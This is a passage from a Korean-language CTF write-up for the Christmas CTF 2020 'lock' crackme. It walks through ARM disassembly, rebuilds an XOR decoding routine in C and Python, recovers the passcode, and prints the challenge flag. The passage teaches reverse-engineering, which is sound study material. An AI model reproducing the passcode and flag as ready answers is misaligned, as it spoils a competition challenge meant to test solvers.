class="hljs-attribute">aa0</span>:   b<span class="hljs-number">94027</span>e<span class="hljs-number">0</span>    ldr w<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #36]</span> <span class="hljs-attribute">aa4</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">aa8</span>:   <span class="hljs-number">54</span>fffccb    b.lt    a<span class="hljs-number">40</span> &lt;sub_<span class="hljs-number">9</span>fc+<span class="hljs-number">0</span>x<span class="hljs-number">44</span>&gt;  // b.tstop <span class="hljs-attribute">aac</span>:   f<span class="hljs-number">9401</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #56]</span> <span class="hljs-attribute">ab0</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">47</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #64</span><span class="hljs-meta"> ab4:   d65f03c0    ret</span></code></pre><p>인자로 받은 값을 차례대로 스택에 저장합니다. <code>w1</code>과 <code>w3</code>은 데이터의 길이로 추정되므로 <code>x0</code>, <code>x2</code>에 들어온 값을 보면 <code>[sp + #40] = \xFC\x7F\x65\x79\xFF\x73\x6C\x7D\xF4\x77\x6D\x61\xE7\x6B\x74\x65\xEC\x6F\x75\x69\xEF\x63\x46\x53\xDA\x5D\x47\x57\xD1\x51\x4E\x5B\xD2\x55\x4F\x5F\xD9\x49\x56\x43\xCA\x4D\x57\x47\xC1\x41\x5E\x4B\xA9\x28\x30\x22\xA2\x2C\x31\x26\xA1\x20</code>, <code>[sp + #24] = \x96\x19\x7\x11\x99\x19\x2\x11</code> 이 됩니다. 스택에 값을 저장한 후 첫 번째 인자의 길이+1 만큼 <code>malloc</code>을 해준 후 <code>sp+#56</code>에 저장합니다. 그 후 첫 번째 인자의 길이를 가져와서 <code>malloc</code>한 주소의 마지막 index에 0x0을 넣어주고 <code>sp+#52</code>에 0을 저장해준 후 <code>a9c</code>로 이동합니다.</p><p><code>a9c</code>에서는 0을 <code>w1</code>에 넣고 첫 번째 문자열의 길이를 <code>w0</code>에 불러온 후 두 개를 비교하여 <code>a40</code>으로 이동합니다. <code>w1=w0</code>이 되면 <code>flag</code>가 <code>0</code>으로 세팅되고 <code>b.lt</code> 연산이 수행되지 않으므로 첫 번째 문자열의 길이만큼 반복하는 구간임을 알 수 있습니다. <code>a40</code>에서 <code>[sp+#40 + sp+#52]</code>의 값을 <code>w2</code>에 넣고 <code>w3</code>에는 <code>sp+#52 - sp+#32 * (sp+#52 / sp+#32)</code> 연산을 통해 <code>sp+#52 % sp+#32</code> 를 수행한 후 해당 주소의 값을 가져와서 두 문자열을 <code>xor</code> 연산합니다.</p><p><code>sub_9fc</code> 를 c로 간단하게 나타내면 아래와 같습니다.</p><pre><code class="hljs c"><span class="hljs-comment">// sub_9fc</span><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">sub_9fc</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* param1, <span class="hljs-keyword">int</span> param2, <span class="hljs-keyword">char</span>* param3, <span class="hljs-keyword">int</span> param4)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span>* var1 = <span class="hljs-built_in">malloc</span>(param2 + <span class="hljs-number">1</span>);    var1[param2] = <span class="hljs-string">&#x27;\0&#x27;</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; param2; i++)    &#123;        var1[<span class="hljs-number">0</span>] = (param1[i] ^ param3[i % param4]) &amp; <span class="hljs-number">0xff</span>;    &#125;    <span class="hljs-keyword">return</span> var1;&#125;</code></pre><p>해당 문자열들이 <code>sub_9fc</code>를 거쳐 어떠한 값이 나오는지 구하는 python 스크립트는 아래와 같습니다.</p><pre><code class="hljs python">string1 = [    <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xFF</span>,    <span class="hljs-number">0x73</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x65</span>,    <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x47</span>,    <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x56</span>,    <span class="hljs-number">0x43</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x30</span>,    <span class="hljs-number">0x22</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x20</span>]string2 = [<span class="hljs-number">0x96</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x11</span>]result = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string1)):    result += chr(string1[i] ^ string2[i % len(string2)])print(result)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p><code>sub_9fc</code>까지 마쳤으니 다시 main으로 돌아가죠!</p><pre><code class="hljs c"><span class="hljs-comment">// main</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">char</span> *var1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">0x13</span>, <span class="hljs-number">1</span>);    <span class="hljs-keyword">int</span> var2 = sub_9b0(sub_ab8());    sub_96c();    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var1);    sub_b30(var1, var2);    <span class="hljs-built_in">free</span>(var1);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>이제 입력 값을 받아서 <code>sub_b30</code>하는 것만 남았네요. <code>sub_b30</code> 함수를 확인해봅시다.</p><pre><code class="hljs apache"><span class="hljs-attribute">0000000000000b30</span> &lt;sub_b<span class="hljs-number">30</span>&gt;: <span class="hljs-attribute">b30</span>:   a<span class="hljs-number">9</span>be<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-32]!</span><span class="hljs-meta"> b34:   910003fd    mov x29, sp</span><span class="hljs-meta"> b38:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">b3c</span>:   f<span class="hljs-number">9000</span>be<span class="hljs-number">1</span>    str x<span class="hljs-number">1</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b40</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b44</span>:   <span class="hljs-number">91001800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">6</span> <span class="hljs-attribute">b48</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b4c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b50</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">b54</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b58</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b5c</span>:   <span class="hljs-number">54000761</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b60</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b64</span>:   <span class="hljs-number">91001000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">4</span> <span class="hljs-attribute">b68</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b6c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b70</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b74</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b78</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b7c</span>:   <span class="hljs-number">54000661</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">b80</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b84</span>:   <span class="hljs-number">91000</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">3</span> <span class="hljs-attribute">b88</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b8c</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">b90</span>:   <span class="hljs-number">91002800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xa <span class="hljs-attribute">b94</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">b98</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b9c</span>:   <span class="hljs-number">54000561</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">ba0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">ba4</span>:   <span class="hljs-number">91001</span>c<span class="hljs-number">00</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">7</span> <span class="hljs-attribute">ba8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bac</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bb0</span>:   <span class="hljs-number">91004400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">11</span> <span class="hljs-attribute">bb4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bb8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bbc</span>:   <span class="hljs-number">54000461</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">bc0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">bc4</span>:   <span class="hljs-number">91000400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span> <span class="hljs-attribute">bc8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bcc</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bd0</span>:   <span class="hljs-number">91003800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>xe <span class="hljs-attribute">bd4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bd8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bdc</span>:   <span class="hljs-number">54000361</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">be0</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">be4</span>:   <span class="hljs-number">91001400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">5</span> <span class="hljs-attribute">be8</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bec</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">bf0</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">34</span> <span class="hljs-attribute">bf4</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">bf8</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">bfc</span>:   <span class="hljs-number">54000261</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c00</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c04</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c08</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c0c</span>:   <span class="hljs-number">9100</span>d<span class="hljs-number">400</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">35</span> <span class="hljs-attribute">c10</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c14</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c18</span>:   <span class="hljs-number">54000181</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c1c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c20</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c24</span>:   <span class="hljs-number">39400001</span>    ldrb    w<span class="hljs-number">1</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c28</span>:   f<span class="hljs-number">9400</span>be<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #16]</span> <span class="hljs-attribute">c2c</span>:   <span class="hljs-number">91000800</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">2</span> <span class="hljs-attribute">c30</span>:   <span class="hljs-number">39400000</span>    ldrb    w<span class="hljs-number">0</span>,<span class="hljs-meta"> [x0]</span> <span class="hljs-attribute">c34</span>:   <span class="hljs-number">6</span>b<span class="hljs-number">00003</span>f    cmp w<span class="hljs-number">1</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">c38</span>:   <span class="hljs-number">54000081</span>    b.ne    c<span class="hljs-number">48</span> &lt;sub_b<span class="hljs-number">30</span>+<span class="hljs-number">0</span>x<span class="hljs-number">118</span>&gt;  // b.any <span class="hljs-attribute">c3c</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">c40</span>:   <span class="hljs-number">97</span>ffffab    bl  aec &lt;sub_aec&gt; <span class="hljs-attribute">c44</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">c48</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">27</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #32</span><span class="hljs-meta"> c4c:   d65f03c0    ret</span></code></pre><p>위에서 복호화한 <code>[a-zA-Z0-9]</code> 값과 입력 값을 통해 하나씩 비교한 후 조건이 모두 맞으면 <code>x0</code>에  input 값을 넣고 <code>sub_aec</code>를 호출합니다. 값을 비교하는 부분을 간단하게 정리하면 아래와 같습니다.</p><ul><li>var1[0x6] == var2[0xe]</li><li>var1[0x4] == var2[0x3]</li><li>var1[0x3] == var2[0xa]</li><li>var1[0x7] == var2[0x11]</li><li>var1[0x1] == var2[0xe]</li><li>var1[0x5] == var2[0x34]</li><li>var1[0x0] == var2[0x35]</li><li>var1[0x2] == var2[0x2]</li></ul><p>순서에 맞춰서 배열하면 input 값을 구할 수 있습니다.</p><pre><code class="hljs python">user_input = <span class="hljs-string">&quot;&quot;</span>user_input += result[<span class="hljs-number">0x35</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x2</span>] + result[<span class="hljs-number">0xa</span>] + result[<span class="hljs-number">0x3</span>] +result[<span class="hljs-number">0x34</span>] + result[<span class="hljs-number">0xe</span>] + result[<span class="hljs-number">0x11</span>]print(user_input)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p>조건이 맞는 입력 값을 인자로 <code>sub_aec</code> 값을 호출하니 해당 함수를 확인해보면 아래와 같습니다.</p><pre><code class="hljs apache"><span class="hljs-attribute">value2</span>  DCB <span class="hljs-number">0</span>x<span class="hljs-number">69</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">38</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">43</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>C, <span class="hljs-number">0</span>x<span class="hljs-number">45</span>, <span class="hljs-number">0</span>xE, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>C,<span class="hljs-attribute">0x8</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">30</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">5</span>F, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>, <span class="hljs-number">0</span>x<span class="hljs-number">19</span>, <span class="hljs-number">0</span>x<span class="hljs-number">3</span>B, <span class="hljs-number">0</span>x<span class="hljs-number">44</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>,<span class="hljs-attribute">0x6E</span>, <span class="hljs-number">0</span>x<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x<span class="hljs-number">53</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1</span>E, <span class="hljs-number">0</span>x<span class="hljs-number">17</span>, <span class="hljs-number">0</span>x<span class="hljs-number">55</span>, <span class="hljs-number">0</span>x<span class="hljs-number">12</span><span class="hljs-attribute">0000000000000aec</span> &lt;sub_aec&gt;: <span class="hljs-attribute">aec</span>:   a<span class="hljs-number">9</span>bd<span class="hljs-number">7</span>bfd    stp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp, #-48]!</span><span class="hljs-meta"> af0:   910003fd    mov x29, sp</span><span class="hljs-meta"> af4:   f9000fe0    str x0, [sp, #24]</span> <span class="hljs-attribute">af8</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">afc</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">29</span>    bl  <span class="hljs-number">7</span>a<span class="hljs-number">0</span> &lt;strlen@plt&gt; <span class="hljs-attribute">b00</span>:   <span class="hljs-number">2</span>a<span class="hljs-number">0003</span>e<span class="hljs-number">3</span>    mov w<span class="hljs-number">3</span>, w<span class="hljs-number">0</span> <span class="hljs-attribute">b04</span>:   f<span class="hljs-number">9400</span>fe<span class="hljs-number">2</span>    ldr x<span class="hljs-number">2</span>,<span class="hljs-meta"> [sp, #24]</span> <span class="hljs-attribute">b08</span>:   <span class="hljs-number">528003</span>e<span class="hljs-number">1</span>    mov w<span class="hljs-number">1</span>, #<span class="hljs-number">0</span>x<span class="hljs-number">1</span>f                   // #<span class="hljs-number">31</span> <span class="hljs-attribute">b0c</span>:   <span class="hljs-number">90000000</span>    adrp    x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@page <span class="hljs-attribute">b10</span>:   <span class="hljs-number">91382000</span>    add x<span class="hljs-number">0</span>, x<span class="hljs-number">0</span>, value<span class="hljs-number">2</span>@pageoff <span class="hljs-attribute">b14</span>:   <span class="hljs-number">97</span>ffffba    bl  <span class="hljs-number">9</span>fc &lt;sub_<span class="hljs-number">9</span>fc&gt; <span class="hljs-attribute">b18</span>:   f<span class="hljs-number">90017</span>e<span class="hljs-number">0</span>    str x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b1c</span>:   f<span class="hljs-number">94017</span>e<span class="hljs-number">0</span>    ldr x<span class="hljs-number">0</span>,<span class="hljs-meta"> [sp, #40]</span> <span class="hljs-attribute">b20</span>:   <span class="hljs-number">97</span>ffff<span class="hljs-number">3</span>c    bl  <span class="hljs-number">810</span> &lt;puts@plt&gt; <span class="hljs-attribute">b24</span>:   d<span class="hljs-number">503201</span>f    nop <span class="hljs-attribute">b28</span>:   a<span class="hljs-number">8</span>c<span class="hljs-number">37</span>bfd    ldp x<span class="hljs-number">29</span>, x<span class="hljs-number">30</span>,<span class="hljs-meta"> [sp], #48</span><span class="hljs-meta"> b2c:   d65f03c0    ret</span></code></pre><p>입력 값과 value2를 인자로 <code>sub_9fc</code>를 수행하는 것을 확인할 수 있습니다. <code>sub_9fc</code>의 경우 아까 python script를 짜 놓았기 때문에 그냥 값을 입력하여 연산하면 됩니다.</p><pre><code class="hljs python">string3 = [    <span class="hljs-number">0x69</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0x3C</span>,<span class="hljs-number">0x8</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x17</span>,<span class="hljs-number">0x6E</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x12</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(string3)):    flag += chr(string3[i] ^ ord(user_input[i % len(user_input)]))print(flag)<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">C:\Users\idioth\Desktop&gt;lock.py</span><span class="hljs-string">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="hljs-string">1ockd0or</span><span class="hljs-string">XMAS&#123;s4nta_can_enter_the_h0use&#125;</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre><p>FLAG : XMAS{s4nta_can_enter_the_h0use}</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf-2020/">christmas ctf 2020</category>
      
      <category domain="https://hackyboiz.github.io/tags/arm/">arm</category>
      
      <category domain="https://hackyboiz.github.io/tags/crackme/">crackme</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/idioth/christmasctf2020-lock/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - Address Book</title>
      <link>https://hackyboiz.github.io/2020/12/29/l0ch/address_book/</link>
